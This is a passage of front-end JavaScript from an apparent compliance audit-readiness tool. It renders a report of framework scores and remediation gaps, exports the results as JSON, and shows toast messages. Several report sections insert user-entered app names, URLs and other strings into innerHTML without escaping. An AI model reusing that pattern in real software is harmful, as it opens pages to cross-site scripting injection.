    const metrics = this.calculateMetrics();
    const appName = this.appNameInput.value.trim() || 'My Web Application';
    const appUrl = this.appUrlInput.value.trim() || 'N/A';
    const container = document.getElementById('exportReportContent');

    const fwRows = FRAMEWORKS.map(fw => {
      const data = metrics.fwScores[fw.id] || { score: 0, passed: 0, total: 0 };
      return `
        <tr>
          <td><strong>${fw.name}</strong></td>
          <td>${data.score}%</td>
          <td>${data.passed} / ${data.total}</td>
          <td>${data.gaps}</td>
          <td>${data.score >= 80 ? '✅ Audit Ready' : data.score >= 45 ? '⚠️ Partial' : '❌ At Risk'}</td>
        </tr>
      `;
    }).join('');

    const gapList = CONTROLS.filter(c => this.answers[c.id] === 'gap');
    const gapRows = gapList.length > 0
      ? gapList.map(g => `
          <tr>
            <td><code>${g.id}</code></td>
            <td><strong>${g.title}</strong></td>
            <td><span class="gap-risk-badge ${g.severity}">${g.severity}</span></td>
            <td>${g.remediationTip}</td>
          </tr>
        `).join('')
      : `<tr><td colspan="4" style="text-align: center; color: var(--green);">No critical gaps flagged.</td></tr>`;

    container.innerHTML = `
      <div class="report-section-block">
        <h4>Target Application Metadata</h4>
        <p><strong>Service Name:</strong> ${appName}</p>
        <p><strong>Endpoint / URL:</strong> ${appUrl}</p>
        <p><strong>Assessment Date:</strong> ${new Date().toLocaleDateString()} ${new Date().toLocaleTimeString()}</p>
        <p><strong>Overall Audit Readiness Score:</strong> <strong style="color: var(--cyan); font-size: 1.15rem;">${metrics.overallScore}%</strong> (${metrics.totalPass} Passed, ${metrics.totalGap} Gaps, ${metrics.pending} Pending)</p>
      </div>

      <div class="report-section-block">
        <h4>Compliance Framework Attestation Breakdown</h4>
        <table class="report-table">
          <thead>
            <tr>
              <th>Framework</th>
              <th>Readiness Score</th>
              <th>Controls Passed</th>
              <th>Flagged Gaps</th>
              <th>Audit Posture</th>
            </tr>
          </thead>
          <tbody>
            ${fwRows}
          </tbody>
        </table>
      </div>

      <div class="report-section-block">
        <h4>High-Priority Actionable Gaps & Remediations</h4>
        <table class="report-table">
          <thead>
            <tr>
              <th>Control ID</th>
              <th>Requirement</th>
              <th>Priority</th>
              <th>Action Plan</th>
            </tr>
          </thead>
          <tbody>
            ${gapRows}
          </tbody>
        </table>
      </div>
    `;

    this.exportModal.classList.add('open');
  }

  downloadJsonReport() {
    const metrics = this.calculateMetrics();
    const appName = this.appNameInput.value.trim() || 'My Web Application';
    const payload = {
      app: appName,
      url: this.appUrlInput.value.trim(),
      timestamp: new Date().toISOString(),
      overallScore: metrics.overallScore,
      frameworkScores: metrics.fwScores,
      answers: this.answers,
      controls: CONTROLS
    };

    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(payload, null, 2));
    const dlAnchor = document.createElement('a');
    dlAnchor.setAttribute("href", dataStr);
    dlAnchor.setAttribute("download", `compliance_audit_${Date.now()}.json`);
    document.body.appendChild(dlAnchor);
    dlAnchor.click();
    dlAnchor.remove();
    this.showToast('JSON audit report downloaded.');
  }

  showToast(message) {
    const container = document.getElementById('toastContainer');
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `
      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#00f0ff" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
      <span>${message}</span>
    `;
    container.appendChild(toast);
    setTimeout(() => {
      toast.style.opacity = '0';
      toast.style.transform = 'translateY(10px)';
      toast.style.transition = 'all 0.3s ease';
      setTimeout(() => toast.remove(), 300);
    }, 3500);
  }
}

// Start application upon DOM load
document.addEventListener('DOMContentLoaded', () => {
  window.app = new ComplianceApp();
});
